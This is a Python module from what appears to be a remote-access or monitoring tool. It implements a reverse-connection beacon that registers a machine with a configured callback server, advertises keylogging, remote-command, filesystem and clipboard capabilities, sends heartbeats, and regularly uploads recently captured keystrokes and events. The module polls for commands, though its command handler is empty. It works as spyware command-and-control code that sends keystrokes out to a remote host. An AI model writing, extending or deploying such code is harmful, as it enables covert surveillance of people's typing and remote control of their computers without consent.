"""
Reverse Connection - Server pushes data to client
Complete implementation with registration
"""
import threading
import time
import requests
from datetime import datetime

from .config import config, pc_id, API_KEY, load_callback_config
from .monitoring import get_monitoring_status, get_events, get_keystrokes
from .screenshots import get_screenshot_history
from .utils import get_local_ip

class ReverseConnection:
    """Enhanced reverse connection - server auto-registers with client"""
    
    def __init__(self, callback_config):
        self.callback_url = callback_config.get('callback_url')
        self.callback_key = callback_config.get('callback_key')
        self.interval = callback_config.get('interval', 15)
        self.heartbeat_interval = callback_config.get('heartbeat_interval', 5)
        self.retry_interval = callback_config.get('retry_interval', 10)
        self.enabled = callback_config.get('enabled', False)
        self.running = True
        self.connected = False
        self.registered = False
        self.last_heartbeat = None
        
    def start(self):
        """Start the reverse connection threads"""
        if not self.enabled:
            print("Reverse connection disabled")
            return
        
        thread = threading.Thread(target=self._callback_loop, daemon=True)
        thread.start()
        
        heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        print(f"✓ Reverse connection enabled - will connect to {self.callback_url}")
    
    def stop(self):
        """Stop the reverse connection"""
        self.running = False
        self.connected = False
    
    def _heartbeat_loop(self):
        """Send periodic heartbeats to maintain connection"""
        while self.running:
            if self.connected:
                try:
                    response = requests.post(
                        f"{self.callback_url}/heartbeat",
                        json={
                            "pc_id": pc_id,
                            "pc_name": config.get('pc_name', 'Unknown'),
                            "timestamp": datetime.now().isoformat()
                        },
                        headers={'X-Callback-Key': self.callback_key},
                        timeout=3
                    )
                    
                    if response.status_code == 200:
                        self.last_heartbeat = datetime.now()
                    else:
                        self.connected = False
                        self.registered = False
                        print(f"✗ Lost connection to client (heartbeat failed)")
                        
                except Exception:
                    self.connected = False
                    self.registered = False
                    
            time.sleep(self.heartbeat_interval)
    
    def _callback_loop(self):
        """Main loop that sends data back to client"""
        while self.running:
            try:
                # Register with client if not connected
                if not self.connected:
                    if self._register_with_client():
                        self.connected = True
                        self.registered = True
                        print(f"✓ Registered with client at {self.callback_url}")
                    else:
                        time.sleep(self.retry_interval)
                        continue
                
                # Collect and send data
                data = self._collect_data()
                
                response = requests.post(
                    f"{self.callback_url}/callback",
                    json=data,
                    headers={'X-Callback-Key': self.callback_key},
                    timeout=5
                )
                
                if response.status_code == 200:
                    result = response.json()
                    # Handle commands from client if any
                    if result.get('commands'):
                        for command in result['commands']:
                            self._handle_command(command)
                    
                    time.sleep(self.interval)
                else:
                    raise Exception(f"Bad response: {response.status_code}")
                    
            except Exception as e:
                if self.connected:
                    print(f"✗ Lost connection to client: {e}")
                    self.connected = False
                    self.registered = False
                
                time.sleep(self.retry_interval)
    
    def _register_with_client(self):
        """Register this server with the client"""
        try:
            local_ip = get_local_ip()
            
            registration_data = {
                "type": "register",
                "pc_id": pc_id,
                "pc_name": config.get('pc_name', 'Unknown'),
                "server_url": f"http://{local_ip}:{config['port']}",
                "api_key": API_KEY,
                "timestamp": datetime.now().isoformat(),
                "capabilities": {
                    "monitoring": True,
                    "screenshots": True,
                    "keylogging": True,
                    "remote_commands": True,
                    "process_management": True,
                    "filesystem": True,
                    "clipboard": True
                }
            }
            
            response = requests.post(
                f"{self.callback_url}/register",
                json=registration_data,
                headers={'X-Callback-Key': self.callback_key},
                timeout=5
            )
            
            if response.status_code in [200, 202]:
                return True
            else:
                print(f"Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"Registration error: {e}")
            return False
    
    def _collect_data(self):
        """Collect data to send to client"""
        return {
            "pc_id": pc_id,
            "pc_name": config.get('pc_name', 'Unknown'),
            "timestamp": datetime.now().isoformat(),
            "monitoring": get_monitoring_status(),
            "event_count": len(get_events()),
            "keystroke_count": len(get_keystrokes()),
            "screenshot_count": len(get_screenshot_history()),
            "events": get_events()[-10:],  # Last 10 events
            "keystrokes": get_keystrokes()[-20:]  # Last 20 keystrokes
        }
    
    def _handle_command(self, command):
        """Handle commands from client"""
        # Commands can be implemented here if needed
        pass